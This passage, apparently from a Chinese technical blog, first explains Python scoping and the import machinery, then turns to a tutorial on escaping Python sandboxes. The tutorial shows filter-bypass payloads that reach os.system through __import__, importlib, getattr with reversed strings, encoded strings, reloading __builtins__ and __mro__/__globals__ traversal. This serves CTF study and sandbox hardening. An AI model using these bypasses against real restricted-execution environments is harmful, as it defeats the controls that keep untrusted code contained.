程序可以直接访问命名空间的正文区域。</p><ul><li>Python 程序中，直接访问一个变量，会从内到外依次访问所有的作用域直到找到，否则会报未定义的错误。</li><li>Python 中，程序的变量并不是在哪个位置都可以访问的，访问权限决定于这个变量是在哪里赋值的。</li><li>Python 中， 变量的作用域决定了在哪一部分程序可以访问哪个特定的变量名称</li></ul><p>作用域分为4类，分别如下：</p><ul><li>L（Local）：最内层，包含局部变量，比如一个函数/方法内部。</li><li>E（Enclosing）：包含了非局部(non-local)也非全局(non-global)的变量。比如两个嵌套函数，一个函数（或类） A 里面又包含了一个函数 B ，那么对于 B 中的名称来说 A 中的作用域就为 nonlocal。</li><li>G（Global）：当前脚本的最外层，比如当前模块的全局变量。</li><li>B（Built-in）： 包含了内建的变量/关键字等，最后被搜索。</li></ul><p>作用域规则顺序为： L-&gt;E-&gt;G-&gt;B 如果变量在局部内找不到，便会去局部外的局部找（例如闭包），再找不到就会去全局找，再找不到就去内置中找，</p><h2 id="Python-import机制"><a href="#Python-import机制" class="headerlink" title="Python import机制"></a>Python import机制</h2><p>具体细节参考官方文档</p><h3 id="模块-module-与-包-package"><a href="#模块-module-与-包-package" class="headerlink" title="模块 module 与 包 package"></a><strong>模块 module 与 包 package</strong></h3><p>模块–</p><p>一个 <em>.py</em> 后缀文件即是 Python 的一个模块。在模块的内部，可以通过全局变量 <code>__name__</code> 来获得模块名。模块可以包含可执行的语句，这些语句会在模块 <strong>初始化</strong> 的时候执行 —— 当所在模块被 <code>import</code> 导入时它们有且只会执行一次。</p><p>包–</p><p>目前的 Python 实际上是有两种包的存在：<strong>正规包</strong>（<em>regular Package</em>） 以及 <strong>命名空间包</strong>（<em>Namespace package</em>）。</p><blockquote><p>要注意的是，Python 的 package 实际上都是特殊的 module ：可以通过导入 package 之后查看 <code>globals()</code> 可知；实际上，任何带有 <strong>path</strong> 属性的对象都会被 Python 视作 package 。</p></blockquote><ul><li>正规包： 在 Python 3.2 之前就已经存在了的，通常是以包含一个 <code>__init__.py</code> 文件的目录形式展现。当 package 被导入时，这个 <code>__init__.py</code> 文件会被 <em>隐式</em> 地执行。</li><li>命名空间包： 根据 PEP420 的定义，命名空间包是由多个 <em>portion</em> 组成的 —— <em>portion</em> 类似于父包下的子包，但它们物理位置上不一定相邻，而且它们可能表现为 .zip 中的文件、网络上的文件等等。命名空间包不需要 <code>__init__.py</code> 文件，只要它本身或者子包（也就是 <em>portion</em>）被导入时，Python 就会给顶级的部分创建为命名空间包 —— 因此，命名空间包不一定直接对应到文件系统中的对象，它可以是一个 <em>虚拟</em> 的 module 。</li></ul><h2 id="import导包"><a href="#import导包" class="headerlink" title="import导包"></a>import导包</h2><p>import就是将python文件转化为一个python对象–module 的一个操作</p><p>模块中的 Python 代码可以通过 import（导入）操作访问另一个模块内的代码。<code>import</code> 语句时调起导入机制的常用方式，但不是唯一方式。<code>importlib.import_module()</code> 以及内置的 <code>__import__()</code> 函数都可以调起导入机制。</p><p><code>import</code> 语句实际上结合了两个操作：</p><ol><li>搜索操作：根据指定的命名查找模块</li><li>绑定操作：将搜索的结果绑定到当前作用域对应的命名上</li></ol><p><code>import</code> 的 search 操作实际上是带参调用 <code>__import__()</code> 函数，而函数的返回值会用在 <code>import</code> 语句的绑定操作上。</p><p>直接调用 <code>__import__()</code> 只会执行模块查找，以及如果找到的话就创建模块。这会有一定的副作用，比如导入父包和更新各式各样的缓存（包括 <code>sys.modules</code>），而且绑定操作只有 <code>import</code> 语句才会做得到。</p><blockquote><p>其他调起导入机制的行为（比如 <code>importlib.import_module()</code>）有可能会绕过 <code>__import__()</code> 并使用自定义的方法来实现导入。</p></blockquote><p>当一个模块被首次导入时，Python 会搜索该模块，如果找到就创建一个 <code>module</code> 对象并初始化；如果未找到则抛出 <code>ModuleNotFoundError</code> 异常。至于如何找到这些模块，Python 定义了多种的 <strong>搜索策略</strong> （search strategy），而这些策略可以通过 <code>importlib</code> 等提供的各类 hook 来修改和扩展。</p><blockquote><p>根据 Python 3.3 的 changlog 可知目前导入系统已完全实现了 PEP302 的提案，所有的导入机制都会通过 <code>sys.meta_path</code> 暴露出来，不会再有任何隐式的导入机制。</p></blockquote><h2 id="import搜索机制"><a href="#import搜索机制" class="headerlink" title="import搜索机制"></a>import搜索机制</h2><h4 id="模块搜索路径"><a href="#模块搜索路径" class="headerlink" title="模块搜索路径"></a><strong>模块搜索路径</strong></h4><p>当我们要导入一个模块（比如 <code>foo</code> ）时，解释器首先会根据命名查找内置模块，如果没有找到，它就会去查找 <code>sys.path</code> 列表中的目录，看目录中是否有 <em>foo.py</em> 。<code>sys.path</code> 的初始值来自于：</p><ul><li>运行脚本所在的目录（如果打开的是交互式解释器则是当前目录）</li><li><code>PYTHONPATH</code> 环境变量（类似于 <code>PATH</code> 变量，也是一组目录名组成）</li><li>Python 安装时的默认设置</li></ul><p>为了开始搜索，Python 需要被导入模块（或者包）的完全限定名(<em>fully qualified name</em>)。这个名称可能作为 <code>import</code> 语句的参数得到，或者是从函数 <code>importlib.import_module()</code> 或 <code>__import__()</code> 的传参得到。</p><h4 id="1-缓存-cache"><a href="#1-缓存-cache" class="headerlink" title="1.缓存 cache"></a>1.<strong>缓存 cache</strong></h4><p>在导入搜索开始前，会先检查 <code>sys.modules</code> </p><p><code>sys.modules</code> 是一个字典，里面储存了加载过的模块信息。如果 Python 是刚启动的话，所列出的模块就是解释器在启动时自动加载的模块。有些库例如 <code>os</code> 是默认被加载进来的，但是不能直接使用（但是可以通过 <code>sys.modules</code> 来使用，例如 <code>sys.modules["os"]</code>），原因在于 sys.modules 中未经 import 加载的模块对当前空间是不可见的。</p><p>它是导入系统的缓存，如果之前已经导入过 <code>foo.bar.baz</code>，则将会包含 <code>foo</code>，<code>foo.bar</code> 以及 <code>foo.bar.baz</code> 键，其对应的值为各自的 <code>module</code> 对象。</p><p>导入期间，如果在 <code>sys.modules</code> 找到对应的模块名的键，则取出其值，导入完成（如果值为 <code>None</code> 则抛出 <code>ModuleNotFoundError</code> 异常）；否则就进行搜索操作。</p><blockquote><p><code>sys.modules</code> 是可修改的，强制赋值 <code>None</code> 会导致下一次导入该模块抛出 <code>MoudleNotFoundError</code> 异常；如果删掉该键则会让下次导入触发搜索操作。</p></blockquote><p>注意，如果要更新缓存，使用 <strong>删除</strong> <strong>sys.modules</strong> <strong>的键</strong> 这种做法会有副作用，因为这样回导致前后导入的同名模块的 <code>module</code> 对象不是同一个。最好的做法应该是使用 <code>importlib.reload()</code> 函数。</p><h4 id="2-查找器-finder-和加载器-loader"><a href="#2-查找器-finder-和加载器-loader" class="headerlink" title="2.查找器 finder 和加载器 loader"></a>2.<strong>查找器</strong> <strong>finder</strong> <strong>和加载器</strong> <strong>loader</strong></h4><p>如果在缓存中找不到模块对象，则 Python 会根据 import 协议去查找和加载该模块进来。这个协议在 PEP320 中被提出，有两个主要的组成概念：finder 和 loader 。finder 的任务是确定能否根据已知的策略找到该名称的模块。同时实现了 finder 和 loader 接口的对象叫做 <strong>importer</strong> —— 它会在找到能够被加载的所需模块时返回自身。</p><p>Python 自带了一些默认的 finder 和 importer 。其中第一个知道 <strong>如何定位内置模块</strong>，第二个知道 <strong>如何定位 frozen 模块</strong>，第三个默认的 finder 会在 <strong>import path</strong> 中查找模块（即 <code>path based finder</code>）。</p><blockquote><p>注意在 Python 3.4 之前 finder 会直接返回 loader 而不是 module spec，后者实际上已经包含了 loader 。</p></blockquote><p>我们可以打印来看一下这三个 Importer 和 Finder ：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">import</span> pprintpprint<span class="token punctuation">.</span>pprint<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>meta_path<span class="token punctuation">)</span><span class="token comment"># [&lt;class '_frozen_importlib.BuiltinImporter'&gt;,</span><span class="token comment">#  &lt;class '_frozen_importlib.FrozenImporter'&gt;,</span><span class="token comment">#  &lt;class '_frozen_importlib_external.PathFinder'&gt;]</span></code></pre><p>finder 并不会真正加载模块。如果他能找到对应命名的模块，会返回一个 <em>module spec</em>，它实际上是 module 导入所需信息的封装，供后续导入机制使用来加载模块。</p><h4 id="import-hook"><a href="#import-hook" class="headerlink" title="import hook"></a><strong>import hook</strong></h4><p>import hook 是用来扩展 import 机制的，它有两种类型</p><ul><li>meta hook</li><li>import path hook</li></ul><p>meta hook 会在导入的最开始被调用（在查找缓存 <code>sys.modules</code> 之后），你可以在这里重载对 <code>sys.path</code>、frozen module甚至内置 module 的处理。只需要往 <code>sys.meta_path</code> 添加一个新的 finder 即可注册 meta_hook 。</p><p>import path hook 会在 <code>sys.path</code> （或 <code>package.__path__</code>）处理时被调用，它们会负责处理 <code>sys.path</code> 中的条目。只需要往 <code>sys.path_hooks</code> 添加一个新的可调用对象即可注册 import path hook 。</p><h4 id="元路径-meta-path"><a href="#元路径-meta-path" class="headerlink" title="元路径 meta_path"></a><strong>元路径 meta_path</strong></h4><p>当无法从 <code>sys.modules</code> 中找到模块时，Python 会继续搜索 <code>sys.meta_path</code> 列表，列表中的 finder 会被<strong>依次</strong>用来查询是否知道如何处理这个命名的模块。</p><p>所有的 <em>meta path</em> <em>finder</em> 都必须实现 <code>find_spec</code> 方法（参考 <em>importlib.abc.MetaPathFinder.find_spec</em>），如果无法处理就返回 <code>None</code>；否则返回一个 <code>spec</code> 对象（即 <code>importlib.machinery.ModuleSpec</code> 的实例）。如果全部的 finder 都没有返回，将抛出 <code>ModuleNotFoundError</code> 异常并放弃导入。</p><p><strong>find_spec(fullname, path, target=None)</strong></p><p>以 foo.bar.baz 模块为例对 <code>find_spec</code> 进行说明</p><p>参数说明示例fullname被导入模块的完全限定名foo.bar.bazpath供搜索使用的路径列表，对于最顶级模块，这个值为 None；对于子包，这个值为父包的 <strong>path</strong> 属性值foo.bar.__path__target用作稍后加载目标的现有模块对象，这个值仅会在重载模块时传入None</p><p>对于单个导入请求可能会多次遍历 meta_path，加入示例的模块都尚未被缓存，则会在每个 finder （以 <code>mpf</code> 命名）上依次调用</p><ul><li>mpf.find_spec(“foo”, None, None)</li><li>mpf.find_spec(“foo.bar”, foo.<strong>path</strong>, None)</li><li>mpf.find_spec(“foo.bar.baz”, foo.bar.<strong>path</strong>, None)</li></ul><blockquote><p>Python 3.4 之后 finder 的 <code>find_module()</code> 已被 <code>find_spec()</code> 所替代并弃用。</p></blockquote><h2 id="import加载机制"><a href="#import加载机制" class="headerlink" title="import加载机制"></a>import加载机制</h2><p>源代码</p><pre class="language-python" data-language="python"><code class="language-python">module <span class="token operator">=</span> <span class="token boolean">None</span><span class="token keyword">if</span> spec<span class="token punctuation">.</span>loader <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">and</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>spec<span class="token punctuation">.</span>loader<span class="token punctuation">,</span> <span class="token string">'create_module'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># It is assumed 'exec_module' will also be defined on the loader.</span>    <span class="token comment"># 假定 loader 中已经定义了 `exec_module` 模块</span>    module <span class="token operator">=</span> spec<span class="token punctuation">.</span>loader<span class="token punctuation">.</span>create_module<span class="token punctuation">(</span>spec<span class="token punctuation">)</span><span class="token keyword">if</span> module <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    module <span class="token operator">=</span> ModuleType<span class="token punctuation">(</span>spec<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token comment"># The import-related module attributes get set here:</span><span class="token comment"># 和模块导入相关联的属性在这个初始化方法中被设置</span>_init_module_attrs<span class="token punctuation">(</span>spec<span class="token punctuation">,</span> module<span class="token punctuation">)</span><span class="token keyword">if</span> spec<span class="token punctuation">.</span>loader <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> spec<span class="token punctuation">.</span>submodule_search_locations <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token comment"># namespace package</span>        <span class="token comment"># 倘若这个模块是命名空间包</span>        sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span>spec<span class="token punctuation">.</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> module    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token comment"># unsupported</span>        <span class="token comment"># 不支持命名空间包</span>        <span class="token keyword">raise</span> ImportError<span class="token keyword">elif</span> <span class="token keyword">not</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>spec<span class="token punctuation">.</span>loader<span class="token punctuation">,</span> <span class="token string">'exec_module'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    module <span class="token operator">=</span> spec<span class="token punctuation">.</span>loader<span class="token punctuation">.</span>load_module<span class="token punctuation">(</span>spec<span class="token punctuation">.</span>name<span class="token punctuation">)</span>    <span class="token comment"># Set __loader__ and __package__ if missing.</span>    <span class="token comment"># 如果缺失 `__loader__` 和 `__package__` 属性则要补充</span><span class="token keyword">else</span><span class="token punctuation">:</span>    sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span>spec<span class="token punctuation">.</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> module    <span class="token keyword">try</span><span class="token punctuation">:</span>        spec<span class="token punctuation">.</span>loader<span class="token punctuation">.</span>exec_module<span class="token punctuation">(</span>module<span class="token punctuation">)</span>    <span class="token keyword">except</span> BaseException<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">del</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span>spec<span class="token punctuation">.</span>name<span class="token punctuation">]</span>        <span class="token keyword">except</span> KeyError<span class="token punctuation">:</span>            <span class="token keyword">pass</span>        <span class="token keyword">raise</span><span class="token keyword">return</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span>spec<span class="token punctuation">.</span>name<span class="token punctuation">]</span></code></pre><p>以下是一些细节：</p><ul><li>在 loader 执行 <code>exec_module</code> 之前，需要将模块缓存在 <code>sys.modules</code> ：因为模块可能会导入自身，这样做可以防止无限递归（最坏情况）或多次加载（最好情况）。</li><li>如果加载失败，那么失败的模块会从 <code>sys.modules</code> 中被移除。任何已经存在的模块或者依赖但成功加载的模块都会保留 —— 这和重载不一样，后者即使加载失败也会保留失败的模块在 <code>sys.modules</code> 中。</li><li>模块的执行是加载的关键步骤，它负责填充模块的命名空间。模块执行将会全权委托给 loader ，由 loader 决定如何填充和填充什么。</li><li>创建出来并传递给 <code>exec_module</code> 执行的 module 对象可能和最后被 import 的 module 对象不一样。</li></ul><h3 id="loader-对象"><a href="#loader-对象" class="headerlink" title="loader 对象"></a><strong>loader</strong> <strong>对象</strong></h3><p>loader 是 <code>importlib.abc.Loader</code> 的实例，负责提供最关键的加载功能：模块执行。它的 <code>exec_module()</code> 方法接受唯一一个参数 —— module 对象，它所有的返回值都会被忽略。</p><p>loader 必须满足以下条件：</p><ul><li>如果这个 module 是一个 Python module（和内置模块以及动态加载的扩展相区分），则 loader 应该在模块的全局命名空间（<code>module.__dict__</code>）中执行模块代码。</li><li>如果 loader 不能执行模块，应该抛出 <code>ImportError</code> 异常。</li></ul><p>Python 3.4 的两个变化：</p><ol><li>loader 提供 create_module() 来创建 module 对象（接受一个 module spec object 并返回 module object）。如果返回 None ，则由导入机制自行创建模块。因为 module 对象在模块执行前必须存在 sys.modules 中。</li><li>load_module() 方法被 exec_module() 方法替代，为了向前兼容，如果存在 load_module() 且未实现 exec_module， 导入机制才会使用 load_module() 方法。</li></ol><h3 id="module-spec-对象"><a href="#module-spec-对象" class="headerlink" title="module spec 对象"></a><strong>module</strong> <strong>spec</strong> <strong>对象</strong></h3><p>module spec 主要有两个作用：</p><ol><li>传递 —— 可以在导入系统的不同组件，如 finder 和 loader 之间传递状态信息</li><li>模板(boilerplate)构建 —— 导入机制可以根据 module spec 执行模板加载操作，没有 module spec 则 loader 需要负责完成这个工作。</li></ol><p>module spec 通过 module 对象的 <strong>spec</strong> 属性得以公开，可以查看 <em>ModuleSpec</em> 获取更多信息。</p><pre class="language-python" data-language="python"><code class="language-python"> <span class="token keyword">import</span> requestsrequests<span class="token punctuation">.</span>__spec__ModuleSpec<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'requests'</span><span class="token punctuation">,</span> loader<span class="token operator">=</span><span class="token operator">&lt;</span>_frozen_importlib_external<span class="token punctuation">.</span>SourceFileLoader <span class="token builtin">object</span> at <span class="token number">0x000002EE4EBBF7B8</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> origin<span class="token operator">=</span><span class="token string">'C:\\Python37\\lib\\site-packages\\requests\\__init__.py'</span><span class="token punctuation">,</span> submodule_search_locations<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'C:\\Python37\\lib\\site-packages\\requests'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>在 <code>_init_module_attrs</code> 步骤中，导入机制会根据 module spec 填充 module 对象（这个过程发生在 loader 执行模块之前）</p><table><thead><tr><th><strong>属性</strong></th><th>说明</th></tr></thead><tbody><tr><td><strong>name</strong></td><td>模块的完全限定名</td></tr><tr><td><strong>loader</strong></td><td>模块加载时使用的 loader 对象，主要是用于内省</td></tr><tr><td><strong>package</strong></td><td>取代 <code>__name__</code> 用于处理相对导入，必须设置！当导入包时，这个值和 <code>__name__</code> 相同；当导入子包时，则为其父包名；为顶级模块时，应该为空字符串</td></tr><tr><td><strong>spec</strong></td><td>导入时要使用的 module spec 对象</td></tr><tr><td><strong>path</strong></td><td>如果模块为包，则必须设置！这个值为可迭代对象，如果没有进一步用途，可以为空，否则迭代结果应该为字符串</td></tr><tr><td><strong>file</strong></td><td>可选值，只有内置模块可以不设置 <code>__file__</code> 属性</td></tr><tr><td><strong>cached</strong></td><td>为编译后字节码文件所在路径，它和 <code>__file__</code> 的存在互不影响</td></tr></tbody></table><blockquote><p>在命名空间包出来之前，如果想实现命名空间包功能，一般是在包的 <code>__init__.py</code> 中修改其 <code>__path__</code> 属性。随着 PEP420 的引入，命名空间包已经可以不需要 <code>__init__.py</code> 的这种操作了。</p></blockquote><h3 id="path-based-finder-基于元路径查找器"><a href="#path-based-finder-基于元路径查找器" class="headerlink" title="path-based-finder 基于元路径查找器"></a><strong>path-based-finder 基于元路径查找器</strong></h3><p>上文已经提到过，Python 默认自带了几个 meta path 的 finder ，其中之一就是 <strong>PathBasedFinder</strong> ，它负责搜索 <em>import path</em> 上的路径。</p><p>这个 finder 实际上并不知道如何进行 import ，它的工作只是遍历 <em>import path</em> 上的每一个条目，将它们关联到某个知道如何处理特定类型路径的 <strong>path entry finder</strong>（路径条目查找器）。</p><blockquote><p>根据术语表，<strong>path entry</strong> <strong>finder</strong> 是由 <code>sys.path_hook</code> 列表中的可调用对象返回的（前提是它知道如何根据特定路径条目找到模块）。</p></blockquote><p>可以将 <em>PathEntryFinder</em> 看作 <em>PathBasedFinder</em> 的具体实现。实际上，如果从 <code>sys.meta_path</code> 中移除了 <em>PathBasedFinder</em> ，则不会有任何 <em>PathEntryFinder</em> 被调用。</p><h3 id="path-entry-finder-路径条目查找器"><a href="#path-entry-finder-路径条目查找器" class="headerlink" title="path entry finder 路径条目查找器"></a><strong>path entry</strong> <strong>finder</strong> <strong>路径条目查找器</strong></h3><p><em>PathBasedFinder</em> 会使用到三个变量，它们会提供给自定义导入机制的额外途径，包括：</p><ul><li><code>sys.path</code></li><li><code>sys.path_hooks</code></li><li><code>sys.path_importer_cache</code></li></ul><blockquote><p>包的 <strong>path</strong> 属性也会被使用。</p></blockquote><p><code>sys.path</code> 是一个字符串列表，提供了模块和包的搜索位置。它的条目可以来自于文件系统的目录、zip 文件或者其他潜在可以找到模块的“位置”（参考 <code>site</code> 模块）。</p><p>由于 <em>PathBasedFinder</em> 是一个 <em>meta path</em> <em>finder</em> ，所以必须实现了 <code>find_spec()</code> 方法。导入机制会通过调用这个方法来搜索 <em>import path</em> （通过传入 <code>path</code> 参数 —— 它是一个可遍历的字符串列表）。</p><p>在 <code>find_spec()</code> 内部，会迭代 path 的每个条目，并且每次都查找与条目相对应的 <em>PathEntryFinder</em>。但由于这个操作会很耗资源，因此 <em>PathBasedFinder</em> 会维持一个缓存 —— <code>sys.path_importer_caceh</code> 来存放路径条目到 finder 之间的映射（虽然是这样子命名，但它存放的确实是 finder 对象而不是 importer 对象）。那么只要条目找到过一次 finder 就不会重新再匹配（你可以手动移除缓存条目来达到再次强制匹配的目的）。</p><p>如果缓存中没有对应路径条目的键，则会迭代 <code>sys.path_hooks</code> 中的每个 可调用对象。这些可调用对象都接受一个 <code>path</code> 参数，并返回一个 <em>PathEntryFinder</em> 或者抛出 <code>ImportError</code> 异常。</p><p>如果遍历完整个 <code>sys.path_hooks</code> 的可调用对象都没有返回 <em>PathEntryFinder</em>，则 <code>find_spec()</code> 方法会在 <code>sys.path_importer_cache</code> 中存入 <code>None</code> 并返回 <code>None</code> ，表示 <em>PathBasedFinder</em> 无法找到该模块。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>python启动时默认初始化能得到的:</p><ul><li>sys.modules : 一个存放了曾经导入的模块(也包括一些内置模块)的字典(缓存)</li><li>sys.path ：初始化的路径(包括项目路径，系统PATH路径，Python安装的路径)</li></ul><p>当需要import一个模块时，主要分为查找和加载两步</p><ul><li>查找：首先在sys.modules中查找，若未查找到，则触发相应查找机制，通过内置的finder查找器在已经初始化好（sys.path;meta_path）的路径下寻找模块,若找到则会返回一个 <code>spec</code> 对象，否则抛出不能找到模块的异常</li><li>加载：首先会将模块信息缓存在sys.modules中，如果加载失败，那么失败的模块会从 <code>sys.modules</code> 中被移除，然后创建module对象，创建相应的命名空间，并对该module对象进行初始化–写入一些模块内置属性（__name__、__spec__等等）然后传递module对象给加载核心loader,在模块的全局命名空间（module.__dict__）中执行模块代码(创建模块代码中相应对象和执行相应代码)。如果 loader 不能执行模块，应该抛出 <code>ImportError</code> 异常</li></ul><p>加载成功后返回对应module对象赋给import 后面的模块名(当然也可以通过as赋予其他名字)，并写入缓存</p><p>参考文章：<a href="http://sinhub.cn/2019/05/python-import-machinery-part-one/">http://sinhub.cn/2019/05/python-import-machinery-part-one/</a></p><h1 id="命令执行沙箱逃逸"><a href="#命令执行沙箱逃逸" class="headerlink" title="命令执行沙箱逃逸"></a>命令执行沙箱逃逸</h1><h2 id="import"><a href="#import" class="headerlink" title="import"></a>import</h2><p>直接禁用 <code>import os</code> 肯定是不行的</p><pre class="language-none"><code class="language-none">import  osimport   osimport    os...</code></pre><p>如果多个空格也过滤了，Python 能够 import 的可不止 <code>import</code>，还有 <code>__import__</code>：<code>__import__('os')</code>，<code>__import__</code>被干了还有 <code>importlib</code>：<code>importlib.import_module('os').system('ls')</code></p><p>import本质上就是执行一遍导入的库。这个过程实际上可以用 <code>execfile</code> 来代替（python2）：</p><pre class="language-none"><code class="language-none">execfile('/usr/lib/python2.7/os.py')system('ls')</code></pre><p>也可以这样，比较通用</p><pre class="language-none"><code class="language-none">with open('/usr/lib/python3.6/os.py','r') as f:    exec(f.read())system('ls')</code></pre><p>不过要使用上面的这两种方法，就必须知道库的路径。其实在大多数的环境下，库都是默认路径。如果 sys 没被干掉的话，还可以确认一下</p><pre class="language-none"><code class="language-none">import sysprint(sys.path)</code></pre><p>如果将 os 从 sys.modules 中剔除，os 就彻底没法用了：</p><p>注意，这里不能用 <code>del sys.modules['os']</code>，因为，当 import 一个模块时：import A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 module 对象，并加载 A。</p><p>所以删了 <code>sys.modules['os']</code> 只会让 Python 重新加载一次 os。</p><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>可以通过 <code>getattr</code> 拿到对象的方法、属性</p><p>与 <code>getattr</code> 相似的还有 <code>__getattr__</code>、<code>__getattribute__</code>，它们自己的区别就是<code>getattr</code>相当于<code>class.attr</code>，都是获取类属性/方法的一种方式，在获取的时候会触发<code>__getattribute__</code>，如果<code>__getattribute__</code>找不到，则触发<code>__getattr__</code></p><pre class="language-none"><code class="language-none">import osgetattr(os, 'metsys'[::-1])('whoami')</code></pre><pre class="language-none"><code class="language-none">&gt;&gt;&gt; getattr(getattr(__builtins__, '__tropmi__'[::-1])('so'[::-1]), 'metsys'[::-1])('whoami')macr0phag30</code></pre><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>代码中要是出现 <code>os</code>，直接不让运行。那么可以利用字符串的各种变化来引入 os</p><p>以禁掉os字符串为例：</p><ol><li>字符串数组逆序</li></ol><pre class="language-none"><code class="language-none">__import__('so'[::-1]).system('ls')</code></pre><ol><li>字符串拼接</li></ol><pre class="language-none"><code class="language-none">b = 'o'a = 's'__import__(a+b).system('ls')</code></pre><ol><li>还可以利用 <code>eval</code> 或者 <code>exec</code></li></ol><pre class="language-none"><code class="language-none">&gt;&gt;&gt; eval(')"imaohw"(metsys.)"so"(__tropmi__'[::-1])macr0phag30&gt;&gt;&gt; exec(')"imaohw"(metsys.so ;so tropmi'[::-1])macr0phag3</code></pre><p>eval、exec 都是相当危险的函数，exec 比 eval 还要危险</p><p>对字符串的处理可以有：逆序、拼接、base64、hex、rot13…等等，</p><pre class="language-none"><code class="language-none">['__builtins__'] ['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f'][u'\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f']['X19idWlsdGluc19f'.decode('base64')]['__buil'+'tins__']['__buil''tins__']['__buil'.__add__('tins__')]["_builtins_".join("__")]['%c%c%c%c%c%c%c%c%c%c%c%c' % (95, 95, 98, 117, 105, 108, 116, 105, 110, 115, 95, 95)]...</code></pre><h2 id="builtins、builtin-与-builtins"><a href="#builtins、builtin-与-builtins" class="headerlink" title="builtins、builtin__与__builtins"></a><strong>builtins、<strong>builtin__与__builtins</strong></strong></h2><p>在 Python 中，有很多函数不需要任何 import 就可以直接使用，例如<code>chr</code>、<code>open</code>。之所以可以这样，是因为 Python 有个叫<code>内建模块</code>（或者叫内建命名空间）的东西，它有一些常用函数，变量和类。顺便说一下，Python 对函数、变量、类等等的查找方式是按 <code>LEGB</code> 规则来找的，其中 B 即代表内建模块</p><p>在 2.x 版本中，内建模块被命名为 <code>__builtin__</code>，到了 3.x 就成了 <code>builtins</code>。它们都需要 import 才能查看：</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; '__import__' in dir(__builtins__)True&gt;&gt;&gt; __builtins__.__dict__['__import__']('os').system('whoami')macr0phag30&gt;&gt;&gt; 'eval' in dir(__builtins__)True&gt;&gt;&gt; 'execfile' in dir(__builtins__)True</code></pre><p>这里稍微解释下 <code>x.__dict__</code> ，它是 x 内部所有属性名和属性值组成的字典，有以下特点：</p><ol><li>内置的数据类型没有 <strong>dict</strong> 属性</li><li>每个类有自己的 <strong>dict</strong> 属性，就算存着继承关系，父类的 <strong>dict</strong> 并不会影响子类的 <strong>dict</strong></li><li>对象也有自己的 <strong>dict</strong> 属性，包含 <code>self.xxx</code> 这种实例属性</li></ol><p>那么既然<code>__builtins__</code>有这么多危险的函数，不如将里面的危险函数破坏了：</p><p>但是我们可以利用 <code>reload(__builtins__)</code> 来恢复 <code>__builtins__</code>。不过，我们在使用 <code>reload</code> 的时候也没导入，说明 <code>reload</code>也在 <code>__builtins__</code>里，那如果连<code>reload</code>都从<code>__builtins__</code>中删了，就没法恢复<code>__builtins__</code>了，需要另寻他法。还有一种情况是利用 <code>exec command in _global</code> 动态运行语句时的绕过</p><h2 id="通过继承关系逃逸"><a href="#通过继承关系逃逸" class="headerlink" title="通过继承关系逃逸"></a><strong>通过继承关系逃逸</strong></h2><p>在 Python 中提到继承就不得不提 <code>mro</code>，<code>mro</code>就是方法解析顺序，因为 Python 支持多重继承，所以就必须有个方式判断某个方法到底是 A 的还是 B 的。2.2 之前是经典类，搜索是深度优先；经典类后来发展为新式类，使用广度优先搜索，再后来新式类的搜索变为 C3 算法；而 3.x 中新式类一统江湖，默认继承 <code>object</code>，当然也是使用的 C3 搜索算法。。。扯远了扯远了，感兴趣的可以搜搜。不管怎么说，总是让人去判断继承关系显然是反人类的，所以 Python 中新式类都有个属性，<code>.__mro__</code> 或 <code>.mro()</code>，是个元组，记录了继承关系：</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; ''.__class__.__mro__(&lt;class 'str'&gt;, &lt;class 'object'&gt;)CEYLON</code></pre><p> 类的实例在获取 <code>__class__</code> 属性时会指向该实例对应的类。可以看到，<code>''</code>属于 <code>str</code>类，它继承了 <code>object</code> 类，这个类是所有类的超类。具有相同功能的还有<code>__base__</code>和<code>__bases__</code>。需要注意的是，经典类需要指明继承 object 才会继承它，否则是不会继承的：</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; class test:...  pass...&gt;&gt;&gt; test.__bases__()&gt;&gt;&gt; class test(object):...  pass...&gt;&gt;&gt; test.__bases__(&lt;type 'object'&gt;,)PYTHON-REPL</code></pre><p>那么知道这个有什么用呢？</p><p>由于没法直接引入 os，那么假如有个库叫<code>oos</code>，在<code>oos</code>中引入了<code>os</code>，那么我们就可以通过<code>__globals__</code>拿到 os。例如，<code>site</code> 这个库就有 <code>os</code>：</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; import site&gt;&gt;&gt; site.os&lt;module 'os' from '/Users/macr0phag3/.pyenv/versions/3.6.5/lib/python3.6/os.py'&gt;MOONSCRIPT</code></pre><p>怎么理解这个 <strong>globals</strong> 呢？它是函数所在的全局命名空间中所定义的全局变量。也就是只要是函数就会有这个属性。除了 <code>builtin_function_or_method</code> 或者是 